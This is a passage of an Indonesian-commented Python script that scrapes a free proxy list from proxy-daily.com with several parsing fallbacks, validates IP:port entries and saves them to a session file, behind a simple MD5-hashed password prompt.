        if "assets" not in ldir("."):
            rich.print("[bold red][>] [/]Assets data tidak ditemukan! Pastikan ada folder 'assets'.")
            exit()
        else:
            rich.print("[bold red][>] [/]Sedang mengambil data proxy...")
            # Header dengan User-Agent yang lebih baru
            hdr = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
            }

            try:
                # Mengambil halaman dari proxy-daily.com dengan timeout
                response = requests.get("https://proxy-daily.com/", headers=hdr, timeout=15) # Timeout ditingkatkan sedikit
                response.raise_for_status() # Akan memunculkan HTTPError untuk status kode 4xx/5xx

                # Parsing konten HTML
                gets = par(response.text, "html.parser")
                woh = [] # Inisialisasi daftar untuk menyimpan proxy

                rich.print("[bold yellow][DEBUG] [/]Mencoba metode pencarian proxy...")

                # --- METODE PENCARIAN 1: Menggunakan kelas yang sudah ada (kemungkinan tidak ditemukan) ---
                proxy_elements_div = gets.findAll("div", {"class": "centeredProxyList freeProxyStyle"})
                if proxy_elements_div:
                    rich.print("[bold green][DEBUG] [/]Ditemukan elemen dengan kelas 'centeredProxyList freeProxyStyle'.")
                    cek = proxy_elements_div[-1]
                    woh = cek.get_text().strip().split("\n")
                else:
                    rich.print("[bold yellow][DEBUG] [/]Kelas 'centeredProxyList freeProxyStyle' tidak ditemukan.")

                # --- METODE PENCARIAN 2: Mencari di tag <pre> ---
                if not woh: # Hanya coba jika metode 1 gagal
                    rich.print("[bold yellow][DEBUG] [/]Mencoba mencari proxy di tag <pre>...")
                    pre_tag = gets.find("pre")
                    if pre_tag:
                        rich.print("[bold green][DEBUG] [/]Ditemukan tag <pre>.")
                        raw_proxies = pre_tag.get_text().strip()
                        woh = raw_proxies.split("\n")
                    else:
                        rich.print("[bold yellow][DEBUG] [/]Tag <pre> tidak ditemukan.")

                # --- METODE PENCARIAN 3: Mencari textarea (kadang digunakan untuk daftar proxy) ---
                if not woh: # Hanya coba jika metode 1 & 2 gagal
                    rich.print("[bold yellow][DEBUG] [/]Mencoba mencari proxy di tag <textarea>...")
                    textarea_tag = gets.find("textarea")
                    if textarea_tag:
                        rich.print("[bold green][DEBUG] [/]Ditemukan tag <textarea>.")
                        raw_proxies = textarea_tag.get_text().strip()
                        woh = raw_proxies.split("\n")
                    else:
                        rich.print("[bold yellow][DEBUG] [/]Tag <textarea> tidak ditemukan.")

                # --- PENTING: TAMBAHKAN METODE PENCARIAN BARU DI SINI SETELAH KAMU CEK MANUAL ---
                # Contoh jika kamu menemukan proxy di <div id="proxy-content">:
                # if not woh:
                #     rich.print("[bold yellow][DEBUG] [/]Mencoba mencari proxy di div dengan ID 'proxy-content'...")
                #     new_proxy_div = gets.find("div", {"id": "proxy-content"})
                #     if new_proxy_div:
                #         rich.print("[bold green][DEBUG] [/]Ditemukan div dengan ID 'proxy-content'.")
                #         woh = new_proxy_div.get_text().strip().split("\n")
                #     else:
                #         rich.print("[bold yellow][DEBUG] [/]Div dengan ID 'proxy-content' tidak ditemukan.")

                # Jika setelah semua upaya 'woh' masih kosong, artinya tidak ada proxy yang ditemukan
                if not woh:
                    rich.print("[bold red][!] [/]Gagal menemukan elemen proxy dengan metode yang dikenal.")
                    rich.print("[bold red][!] [/]Struktur situs https://proxy-daily.com/ kemungkinan besar sudah berubah total.")
                    rich.print("[bold red][!] [/]Harap periksa manual situs tersebut untuk menemukan lokasi proxy baru dan perbarui kode Anda.")
                    return # Keluar dari fungsi karena tidak ada proxy yang ditemukan

                rich.print(f"[bold green][DEBUG] [/]Total baris teks yang ditemukan sebelum validasi: {len(woh)}")

                # Filter dan validasi proxy dengan regex (IP:Port)
                valid_proxies = [p.strip() for p in woh if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$', p.strip())]

                if not valid_proxies:
                    rich.print("[bold yellow][!] [/]Tidak ada proxy valid (IP:Port) yang ditemukan setelah penyaringan.")
                    rich.print("[bold yellow][!] [/]Mungkin format proxy di situs telah berubah atau tidak ada proxy yang tersedia saat ini.")
                    return # Keluar jika tidak ada proxy valid

                # Tulis proxy yang valid ke file .prox
                for prox in valid_proxies:
                    writer("session/.prox", prox)

                rich.print(f"[bold green][>] [/]{len(valid_proxies)} Proxy berhasil diambil dan disimpan!")
                time.sleep(2)
                main() # Lanjutkan ke fungsi utama

            except requests.exceptions.HTTPError as errh:
                rich.print(f"[bold red][>] [/]HTTP Error saat mengambil data: {errh}")
            except requests.exceptions.ConnectionError as errc:
                rich.print(f"[bold red][>] [/]Kesalahan Koneksi saat mengambil data: {errc}")
            except requests.exceptions.Timeout as errt:
                rich.print(f"[bold red][>] [/]Timeout saat mengambil data: {errt}")
            except requests.exceptions.RequestException as err:
                rich.print(f"[bold red][>] [/]Kesalahan Tak Terduga saat mengambil data: {err}")
            except Exception as e:
                rich.print(f"[bold red][>] [/]Terjadi kesalahan lain: {e}")


def masukLog():
	global password_login
	clear()
	print("\n\n\t* Harap login dahulu *")
	pw = input("\n?: password: ")
	enc = hashlib.md5(pw.encode("utf")).hexdigest()
	if password_login == enc:
		check_assets_path()
	else:
		print("!: Login gagal\n")


if __name__=="__main__":
	try:os.mkdir("result")
	except: pass
	try:os.mkdir("session")
	except: pass
	main()
	#check_assets_path()
	#masukLog()
